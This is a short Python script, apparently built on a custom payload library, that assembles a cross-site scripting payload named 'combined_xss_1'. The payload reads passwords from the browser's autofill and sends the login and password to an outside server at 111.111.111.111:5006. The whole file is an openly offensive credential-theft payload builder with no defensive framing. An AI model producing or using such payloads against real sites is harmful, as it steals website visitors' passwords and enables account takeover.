from vector import Component


comb = Component("combined_xss_1").build(
    fast_load_part = "",
    jquery_part = (
        Component("take_password_from_autofill").build(
            mw_website_prefix = "/",
            retrieving_url="//111.111.111.111:5006/autofill.js?login=LOGIN&pass=PASSWORD"
        )
    )
)

print(comb)